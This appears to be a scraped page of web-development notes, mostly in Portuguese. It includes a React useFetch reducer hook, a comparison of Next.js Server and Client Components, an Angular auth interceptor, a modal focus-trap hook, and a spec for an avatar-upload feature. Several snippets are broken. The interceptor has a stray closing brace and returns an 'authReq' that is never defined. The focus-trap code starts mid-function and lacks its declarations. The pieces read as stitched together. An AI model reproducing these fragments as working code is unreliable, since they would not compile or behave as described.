type State = { status: 'idle' | 'loading' | 'success' | 'error'; data: any; error: string | null };
type Action = { type: 'FETCH' } | { type: 'SUCCESS'; payload: any } | { type: 'ERROR'; error: string };

function reducer(state: State, action: Action): State {
  switch (action.type) {
    case 'FETCH':   return { ...state, status: 'loading', error: null };
    case 'SUCCESS': return { status: 'success', data: action.payload, error: null };
    case 'ERROR':   return { ...state, status: 'error', error: action.error };
    default: return state;
  }
}

function useFetch(url: string) {
  const [state, dispatch] = useReducer(reducer, { status: 'idle', data: null, error: null });

  useEffect(() => {
    dispatch({ type: 'FETCH' });
    fetch(url)
      .then(r => r.json())
      .then(data => dispatch({ type: 'SUCCESS', payload: data }))
      .catch(e  => dispatch({ type: 'ERROR', error: e.message }));
  }, [url]);

  return state;
}

🖥️ Server Components vs Client Components

Server Components (padrão no App Router)
  • Renderizam APENAS no servidor
  • Zero JS enviado ao cliente
  • Acesso direto a banco, fs, secrets
  • Não podem usar hooks, event handlers, browser APIs
  • Ideal: layouts, páginas, componentes de dados
Client Components ('use client')
  • Renderizam no cliente (e no servidor para SSR inicial)
  • Podem usar hooks, eventos, browser APIs
  • JS enviado ao bundle do cliente
  • Ideal: interatividade, formulários, estado

@Injectable()
export class AuthInterceptor implements HttpInterceptor {
  private auth = inject(AuthService);

  intercept(req: HttpRequest<any>, next: HttpHandler) {
    const token = this.auth.getToken();
    if (!token) return next.handle(req);

    });
    return next.handle(authReq);
  }

      'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
    );
    const first = focusable?.[0];
    const last  = focusable?.[focusable.length - 1];

    first?.focus(); // mover foco para o modal

    function handleKeyDown(e) {
      if (e.key !== 'Tab') return;
      if (e.shiftKey && document.activeElement === first) {
        e.preventDefault(); last?.focus();
      } else if (!e.shiftKey && document.activeElement === last) {
        e.preventDefault(); first?.focus();
      }
    }

    ref.current?.addEventListener('keydown', handleKeyDown);
    return () => ref.current?.removeEventListener('keydown', handleKeyDown);
  }, []);
}

# SSD: Feature de Upload de Avatar

## Objetivo
Permitir que usuários façam upload de foto de perfil (avatar).

## Contexto Técnico
- Framework: Next.js 14 App Router + TypeScript strict
- Estado: Zustand
- Estilo: Tailwind CSS
- Upload: AWS S3 via presigned URL
- Testes: Jest + RTL

## Comportamento Esperado
1. Usuário clica no avatar atual
2. Abre file picker (apenas: jpg, png, webp, max 5MB)
3. Preview imediato da imagem selecionada
4. Upload para S3 com progress bar
5. Atualiza URL do avatar no banco
6. Toast de sucesso/erro

## Requisitos Não-Funcionais
- Acessível: aria-labels, keyboard navigation
- Validação client-side antes de enviar
- Loading state durante upload
- Tratamento de erro de rede com retry

## Critérios de Aceite (BDD)
- Dado que selecionei um arquivo PNG válido
  Quando confirmar o upload
  Então devo ver o novo avatar em até 3 segundos

- Dado que selecionei um arquivo maior que 5MB
  Quando tentar confirmar
  Então devo ver mensagem de erro "Arquivo muito grande (máx 5MB)"
